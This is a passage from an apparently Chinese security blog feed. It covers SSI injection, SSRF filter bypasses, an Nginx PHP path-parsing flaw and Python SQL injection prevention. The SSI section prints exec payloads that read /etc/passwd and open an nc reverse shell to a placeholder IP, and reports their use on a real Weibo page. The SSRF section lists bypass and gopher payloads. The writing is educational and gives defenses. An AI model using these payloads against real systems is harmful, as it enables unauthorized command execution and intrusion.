<p>更多请参考：<a href="http://www.javaeye.com/topic/306216" target="_blank" rel="external">http://www.javaeye.com/topic/306216</a></p>
<h1 id="0x02-漏洞场景"><a href="#0x02-漏洞场景" class="headerlink" title="0x02 漏洞场景"></a>0x02 漏洞场景</h1><p>在很多业务中，用户输入的内容会显示在页面中。比如，一个存在反射型XSS漏洞的页面，如果输入的payload不是XSS代码而是SSI的标签，同时服务器又开启了对SSI的支持的话就会存在SSI漏洞。</p>
<p>从定义中看出，页面中有一小部分是动态输出的时候使用SSI，<br>比如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">文件相关的属性字段</div><div class="line">当前时间</div><div class="line">访客IP</div><div class="line">调用CGI程序</div></pre></td></tr></table></figure></p>
<h1 id="0x03-SSI注入的条件"><a href="#0x03-SSI注入的条件" class="headerlink" title="0x03 SSI注入的条件"></a>0x03 SSI注入的条件</h1><p>当符合下列条件时，攻击者可以在 Web 服务器上运行任意命令：</p>
<ul>
<li>Web 服务器已支持SSI（服务器端包含）</li>
<li>Web 应用程序未对对相关SSI关键字做过滤</li>
<li>Web 应用程序在返回响应的HTML页面时，嵌入用户输入</li>
</ul>
<p>SSI注入常用命令：</p>
<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="external">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
<h1 id="0x04-SSI挖掘思路"><a href="#0x04-SSI挖掘思路" class="headerlink" title="0x04 SSI挖掘思路"></a>0x04 SSI挖掘思路</h1><p><strong>两个思路：</strong></p>
<ul>
<li>从业务场景来Fuzz，比如获取IP、定位、时间等</li>
<li>识别页面是否包含.stm,.shtm和.shtml后缀</li>
</ul>
<p>google dork：<code>inurl:bin/cklb</code></p>
<h1 id="0x05-SSI漏洞复现"><a href="#0x05-SSI漏洞复现" class="headerlink" title="0x05 SSI漏洞复现"></a>0x05 SSI漏洞复现</h1><h2 id="5-1-本地测试"><a href="#5-1-本地测试" class="headerlink" title="5.1 本地测试"></a>5.1 本地测试</h2><p>我们使用bWAPP来做漏洞演示环境<br>选择：<code>Server-Side Includes (SSI) Injection</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-0.png" alt=""><br>输入个XSS的payload：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-1.png" alt=""><br>成功执行了代码。</p>
<p>再使用下exec指令使用cmd作为参数执行服务器端命令：<code>&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-2.png" alt=""></p>
<h2 id="5-2-漏洞挖掘"><a href="#5-2-漏洞挖掘" class="headerlink" title="5.2 漏洞挖掘"></a>5.2 漏洞挖掘</h2><p>运气好，刚好遇到个微博的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-4.jpg" alt=""></p>
<h1 id="0x06-SSI防御"><a href="#0x06-SSI防御" class="headerlink" title="0x06 SSI防御"></a>0x06 SSI防御</h1><ul>
<li>关闭服务器SSI功能</li>
<li>过滤相关SSI特殊字符（<code>&lt;,&gt;,#,-,&quot;,&#39;</code>）</li>
</ul>
<p>具体请参考：<br><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="external">SSI 注入的介绍和代码防御</a></p>
<h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h2><p><a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="external">http://m.jb51.net/article/25725.htm</a></p>
<p><a href="http://www.kubiji.cn/topic-id998.html" target="_blank" rel="external">http://www.kubiji.cn/topic-id998.html</a></p>
<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="external">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
<p><a href="http://www.mottoin.com/101526.html" target="_blank" rel="external">http://www.mottoin.com/101526.html</a></p>
<p><a href="http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/" target="_blank" rel="external">http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</a></p>
<p><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="external">http://blog.csdn.net/qq_29277155/article/details/52751364</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 自动化 </tag>
            
            <tag> 命令执行 </tag>
            
            <tag> 漏洞挖掘 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRF绕过方法总结]]></title>
      <url>/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>昨天忘了在公众号还是微博上看到的了，看到一个SSRF绕过的技巧，使用的是<code>ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</code>绕过的，自己也没遇到过。然后想想自己对SSRF绕过还是停留在之前的了解，也没学习过新的绕过方法，所以特意找了找资料，学习学习最新黑科技，充充能。</p>
</blockquote>
<a id="more"></a>
<h1 id="0x00-SSRF是什么"><a href="#0x00-SSRF是什么" class="headerlink" title="0x00 SSRF是什么"></a>0x00 SSRF是什么</h1><p>能精简的就不扯淡，一句话就是：利用一个可以发起网络请求的服务当作跳板来攻击内部其他服务。</p>
<h1 id="0x01-SSRF能干什么"><a href="#0x01-SSRF能干什么" class="headerlink" title="0x01 SSRF能干什么"></a>0x01 SSRF能干什么</h1><ul>
<li>探测内网信息</li>
<li>攻击内网或本地其他服务</li>
<li>穿透防火墙</li>
<li>。。。</li>
</ul>
<h1 id="0x02-SSRF怎么找"><a href="#0x02-SSRF怎么找" class="headerlink" title="0x02 SSRF怎么找"></a>0x02 SSRF怎么找</h1><ul>
<li>能够对外发起网络请求的地方</li>
<li>请求远程服务器资源的地方</li>
<li>数据库内置功能</li>
<li>邮件系统</li>
<li>文件处理</li>
<li>在线处理工具</li>
<li>。。。</li>
</ul>
<p><strong>举几个例子：</strong></p>
<ul>
<li>在线识图，在线文档翻译，分享，订阅等，这些有的都会发起网络请求。</li>
<li>根据远程URL上传，静态资源图片等，这些会请求远程服务器的资源。</li>
<li>数据库的比如mongodb的copyDatabase函数，这点看猪猪侠讲的吧，没实践过。</li>
<li>邮件系统就是接收邮件服务器地址这些地方。</li>
<li>文件就找ImageMagick，xml这些。</li>
<li>从URL关键字中寻找，比如：source,share,link,src,imageurl,target等。</li>
</ul>
<p>以上这些不是本文的重点，下面说下重点介绍的SSRF绕过的方法。</p>
<h1 id="0x03-SSRF怎么绕"><a href="#0x03-SSRF怎么绕" class="headerlink" title="0x03 SSRF怎么绕"></a>0x03 SSRF怎么绕</h1><h2 id="1、攻击本地"><a href="#1、攻击本地" class="headerlink" title="1、攻击本地"></a>1、攻击本地</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:80</div><div class="line">http://localhost:22</div></pre></td></tr></table></figure>
<h2 id="2、利用"><a href="#2、利用" class="headerlink" title="2、利用[::]"></a>2、利用<code>[::]</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">利用[::]绕过localhost</div><div class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</div><div class="line">也有看到利用http://0000::1:80/的，但是我测试未成功</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/11.png" alt=""></p>
<h2 id="3、利用"><a href="#3、利用" class="headerlink" title="3、利用@"></a>3、利用<code>@</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.com@127.0.0.1</div></pre></td></tr></table></figure>
<h2 id="4、利用短地址"><a href="#4、利用短地址" class="headerlink" title="4、利用短地址"></a>4、利用短地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</div></pre></td></tr></table></figure>
<h2 id="5、利用特殊域名"><a href="#5、利用特殊域名" class="headerlink" title="5、利用特殊域名"></a>5、利用特殊域名</h2><p>利用的原理是DNS解析<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.owasp.org.127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/2.png" alt=""></p>
<h2 id="6、利用DNS解析"><a href="#6、利用DNS解析" class="headerlink" title="6、利用DNS解析"></a>6、利用DNS解析</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">在域名上设置A记录，指向127.0.1</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/3.png" alt=""></p>
<h2 id="7、利用上传"><a href="#7、利用上传" class="headerlink" title="7、利用上传"></a>7、利用上传</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">也不一定是上传，我也说不清，自己体会 -.-</div><div class="line">修改&quot;type=file&quot;为&quot;type=url&quot;</div><div class="line">比如：</div><div class="line">上传图片处修改上传，将图片文件修改为URL，即可能触发SSRF</div></pre></td></tr></table></figure>
<h2 id="8、利用Enclosed-alphanumerics"><a href="#8、利用Enclosed-alphanumerics" class="headerlink" title="8、利用Enclosed alphanumerics"></a>8、利用Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">利用Enclosed alphanumerics</div><div class="line">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ  &gt;&gt;&gt;  example.com</div><div class="line">List:</div><div class="line">① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/4.png" alt=""></p>
<h2 id="9、利用句号"><a href="#9、利用句号" class="headerlink" title="9、利用句号"></a>9、利用句号</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">127。0。0。1  &gt;&gt;&gt;  127.0.0.1</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/5.png" alt=""></p>
<h2 id="10、利用进制转换"><a href="#10、利用进制转换" class="headerlink" title="10、利用进制转换"></a>10、利用进制转换</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">可以是十六进制，八进制等。</div><div class="line">115.239.210.26  &gt;&gt;&gt;  16373751032</div><div class="line">首先把这四段数字给分别转成16进制，结果：73 ef d2 1a</div><div class="line">然后把 73efd21a 这十六进制一起转换成8进制</div><div class="line">记得访问的时候加0表示使用八进制(可以是一个0也可以是多个0 跟XSS中多加几个0来绕过过滤一样)，十六进制加0x</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/9.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://0177.0.0.1/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/6.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1  &gt;&gt;&gt;  http://2130706433/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/7.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://192.168.0.1  &gt;&gt;&gt;  http://3232235521/</div><div class="line">http://192.168.1.1  &gt;&gt;&gt;  http://3232235777/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/8.png" alt=""></p>
<h2 id="11、利用特殊地址"><a href="#11、利用特殊地址" class="headerlink" title="11、利用特殊地址"></a>11、利用特殊地址</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://0/</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/10.png" alt=""></p>
<h2 id="12、利用协议"><a href="#12、利用协议" class="headerlink" title="12、利用协议"></a>12、利用协议</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">Dict://</div><div class="line">dict://&lt;user-auth&gt;@&lt;host&gt;:&lt;port&gt;/d:&lt;word&gt;</div><div class="line">ssrf.php?url=dict://attacker:11111/</div><div class="line">SFTP://</div><div class="line">ssrf.php?url=sftp://example.com:11111/</div><div class="line">TFTP://</div><div class="line">ssrf.php?url=tftp://example.com:12346/TESTUDPPACKET</div><div class="line">LDAP://</div><div class="line">ssrf.php?url=ldap://localhost:11211/%0astats%0aquit</div><div class="line">Gopher://</div><div class="line">ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a</div></pre></td></tr></table></figure>
<h2 id="13、使用组合"><a href="#13、使用组合" class="headerlink" title="13、使用组合"></a>13、使用组合</h2><p>各种绕过的组合即可</p>
<h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF" target="_blank" rel="external">https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF</a><br><a href="https://twitter.com/albinowax/status/890725759861403648" target="_blank" rel="external">https://twitter.com/albinowax/status/890725759861403648</a><br><a href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/" target="_blank" rel="external">http://blog.safebuff.com/2016/07/03/SSRF-Tips/</a><br><a href="https://hackerone.com/reports/115748" target="_blank" rel="external">https://hackerone.com/reports/115748</a><br><a href="https://www.dailysecurity.fr/server-side-request-forgery/" target="_blank" rel="external">https://www.dailysecurity.fr/server-side-request-forgery/</a><br><a href="https://twitter.com/EdOverflow" target="_blank" rel="external">https://twitter.com/EdOverflow</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection" target="_blank" rel="external">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF%20injection</a><br><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf" target="_blank" rel="external">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</a><br><a href="http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">http://byd.dropsec.xyz/2017/06/04/SSRF%E6%BC%8F%E6%B4%9E%E5%89%96%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/</a><br><a href="http://blog.csdn.net/xinianbuxiu/article/details/53560417" target="_blank" rel="external">http://blog.csdn.net/xinianbuxiu/article/details/53560417</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 渗透测试 </tag>
            
            <tag> CTF </tag>
            
            <tag> WAF绕过 </tag>
            
            <tag> SSRF </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx解析漏洞原理分析]]></title>
      <url>/2017/11/09/Nginx%E8%A7%A3%E6%9E%90%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90/</url>
      <content type="html"><![CDATA[<h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>漏洞介绍：nginx是一款高性能的web服务器，使用非常广泛，其不仅经常被用作反向代理，也可以非常好的支持PHP的运行。<code>Nginx&lt;8.03</code>默认情况下可能导致服务器错误的将任何类型的文件以PHP的方式进行解析，这将导致严重的安全问题，使得恶意的攻击者可能攻陷支持php的nginx服务器。</p>
<a id="more"></a>
<h1 id="0x02-概念介绍"><a href="#0x02-概念介绍" class="headerlink" title="0x02 概念介绍"></a>0x02 概念介绍</h1><h2 id="0x21-CGI"><a href="#0x21-CGI" class="headerlink" title="0x21 CGI"></a>0x21 CGI</h2><p>CGI是规定web server传递过来的数据是何种标准格式，简单说就是一个协议。web server(例如nginx)只是内容的分发者。比如：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">1) 如果请求/index.html，那么web server会去文件系统中找到这个文件，发送给浏览器，这里分发的是静态数据</div><div class="line">2) 如果请求的是/index.php，根据配置文件，nginx知道这个不是静态文件，需要去找PHP解析器来处理，那么他会把这个请求简单处理后交给PHP解析器</div><div class="line"></div><div class="line">问题的核心在于Nginx需要传哪些数据给PHP解析器呢，例如：</div><div class="line">1) url</div><div class="line">2) 查询字符串</div><div class="line">3) POST数据</div><div class="line">4) HTTP header</div><div class="line">...</div></pre></td></tr></table></figure>
<p>所以，CGI本质上就是规定要传哪些数据、以什么样的格式传递给后方处理这个请求的协议。</p>
<h2 id="0x22-FastCGI"><a href="#0x22-FastCGI" class="headerlink" title="0x22 FastCGI"></a>0x22 FastCGI</h2><p>FastCGI顾名思义也是CGI的一个协议，FastCGI只是优化了CGI程序的性能<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">1) 首先，Fastcgi会先启一个master，解析配置文件，初始化执行环境</div><div class="line">2) 然后再启动多个worker</div><div class="line">3) 当请求过来时，master会传递给一个worker，然后立即可以接受下一个请求。这样就避免了重复的劳动，效率提高了</div><div class="line">4) 而且当worker不够用时，master可以根据配置预先启动几个worker等着，同时如果发现空闲worker太多时，也会停掉一些，这样就提高了性能，也节约了资源</div></pre></td></tr></table></figure></p>
<h2 id="0x23-PHP-CGI-PHP-FastCGI"><a href="#0x23-PHP-CGI-PHP-FastCGI" class="headerlink" title="0x23 PHP-CGI/PHP-FastCGI"></a>0x23 PHP-CGI/PHP-FastCGI</h2><p>PHP的解释器是PHP-CGI，PHP-CGI只是个CGI程序，他自己本身只能解析请求，返回结果，不会进程管理</p>
<h2 id="0x24-PHP-FPM"><a href="#0x24-PHP-FPM" class="headerlink" title="0x24 PHP-FPM"></a>0x24 PHP-FPM</h2><p>PHP-FPM是PHP-CGI进程的管理器，用来管理PHP-CGI进程的，PHP-FPM的管理对象是PHP-CGI</p>
<h1 id="0x03-漏洞分析"><a href="#0x03-漏洞分析" class="headerlink" title="0x03 漏洞分析"></a>0x03 漏洞分析</h1><p>nginx默认以cgi的方式支持php的运行，在配置文件中如下配置:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">location ~ .php$ </div><div class="line">&#123;</div><div class="line">    root html;</div><div class="line">    fastcgi_pass 127.0.0.1:9000;</div><div class="line">    fastcgi_index index.php;</div><div class="line">    fastcgi_param SCRIPT_FILENAME /scripts$fastcgi_script_name;</div><div class="line">    include fastcgi_params;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>配置参数说明如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">1. location对请求进行选择的时候会使用URI环境变量进行选择</div><div class="line">    1) 其中传递到后端Fastcgi的关键变量SCRIPT_FILENAME由nginx生成的$fastcgi_script_name决定</div><div class="line">    2) 而通过分析可以看到$fastcgi_script_name是直接由URI环境变量控制的</div><div class="line">2. 这里就是产生问题的点。而为了较好的支持PATH_INFO的提取，在PHP的配置选项里存在cgi.fix_pathinfo选项，其目的是为了从SCRIPT_FILENAME里取出真正的脚本名 </div><div class="line"></div><div class="line">我们来假设一个攻击场景:</div><div class="line"></div><div class="line">    1. 假设存在一个URL: http://localhost/test/test.jpg</div><div class="line">    2. 我们以如下的方式去访问: http://localhost/test/test.jpg/test.php</div><div class="line">    3. nginx将会得到一个URI: /test.jpg/test.php</div><div class="line">    4. 经过location指令，该请求将会交给后端的fastcgi处理，nginx为其设置环境变量SCRIPT_FILENAME，内容为: /scripts/test.jpg/test.php</div><div class="line">    5. 后端的fastcgi在接受到该选项时，会根据fix_pathinfo配置决定是否对SCRIPT_FILENAME进行额外的处理，一般情况下如果不对fix_pathinfo进行设置将影响使用PATH_INFO进行路由选择的应用，所以该选项一般配置开启。php通过该选项之后将查找其中真正的脚本文件名字，查找的方式也是查看文件是否存在，这个时候将分离出SCRIPT_FILENAME和PATH_INFO分别为</div><div class="line">    1) SCRIPT_FILENAME: /scripts/test.jpg</div><div class="line">    2) PATH_INFO: test.php</div><div class="line">    6. 最后，以/scripts/test.jpg作为此次请求需要执行的脚本，而nginx会使用php解析器来处理这个jpg文件，攻击者就可以实现让nginx以php来解析任何类型的文件了</div></pre></td></tr></table></figure>
<p>所以，漏洞的本质实际上就是由于fcgi和web server对script路径级参数的理解不同出现的问题，这是典型的因为跨系统语境不同导致对同一个请求的不同解释导致的漏洞，它的攻击面是带有这种漏洞的nginx</p>
<h1 id="0x04-修复方案"><a href="#0x04-修复方案" class="headerlink" title="0x04: 修复方案"></a>0x04: 修复方案</h1><ol>
<li>修改<code>php.ini</code>配置</li>
</ol>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cgi.fix_pathinfo = 0</div></pre></td></tr></table></figure>
<ol>
<li>nginx配置文件中添加<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">if ( $fastcgi_script_name ~ ..*/.*php ) </div><div class="line">&#123;</div><div class="line">    return 403;</div><div class="line">&#125;</div><div class="line">/*</div><div class="line">考虑到MVC框架、用户自定义站点中有可能出现xxx/xx.php的情况，这个规则应该更加细粒度一点，例如*.jpg/.*php、*.txt/.*php</div><div class="line">*/</div><div class="line">另外，nginx可以在不需要重启的情况，hotreload配置文件</div><div class="line">service nginx reload </div><div class="line">//or </div><div class="line">/etc/init.d/nginx reload</div></pre></td></tr></table></figure>
</li>
</ol>
<p><strong>参考文章：</strong></p>
<p><a href="http://www.80sec.com/nginx-securit.html" target="_blank" rel="external">http://www.80sec.com/nginx-securit.html</a><br><a href="http://php.net/manual/zh/ini.core.php" target="_blank" rel="external">http://php.net/manual/zh/ini.core.php</a><br><a href="http://www.cnblogs.com/LittleHann/p/4561462.html" target="_blank" rel="external">http://www.cnblogs.com/LittleHann/p/4561462.html</a><br><a href="http://php.net/manual/zh/install.fpm.configuration.php" target="_blank" rel="external">http://php.net/manual/zh/install.fpm.configuration.php</a><br><a href="http://php.net/manual/zh/install.fpm.php" target="_blank" rel="external">http://php.net/manual/zh/install.fpm.php</a><br><a href="http://segmentfault.com/q/1010000000256516" target="_blank" rel="external">http://segmentfault.com/q/1010000000256516</a></p>
]]></content>
      
        
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> 解析漏洞 </tag>
            
            <tag> 漏洞分析 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python安全开发之SQL注入]]></title>
      <url>/2017/11/05/Python%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>PHP中使用的预编译在python中同样适用，同样可以用预编译来防止python编码中的SQL注入问题。<br><a id="more"></a></p>
<p><strong>错误用法：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">sql = &quot;select id,name from user where id = %s and name = %s&quot; % (id, name)</div><div class="line">cur.execute(sql)</div></pre></td></tr></table></figure></p>
<p>这种用法就是常见的拼接字符串导致sql注入漏洞的产生。</p>
<p><strong>正确用法：</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">args = (id, name)</div><div class="line">cur.execute(&apos;select id,name from user where id = %s and name = %s&apos;, args )</div></pre></td></tr></table></figure>
<p>使用如此参数带入方式，python会自动过滤args中的特殊字符，制止SQL注入的产生。</p>
<p>execute()函数本身就有接受SQL语句变量的参数位，可以通过python自身的函数处理sql注入问题,只要正确的使用（即：使用”逗号”，而不是”百分号”）就可以对传入的值进行正确的转义，从而避免SQL注入的发生。</p>
<p>For Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">import sqlite3</div><div class="line"></div><div class="line">con = sqlite3.connect(&quot;:memory:&quot;)</div><div class="line">cur = con.cursor()</div><div class="line">cur.execute(&quot;create table people (name, age)&quot;)</div><div class="line"> </div><div class="line">who = &quot;test&quot;</div><div class="line">age = 22</div><div class="line"> </div><div class="line"># This is the qmark style:</div><div 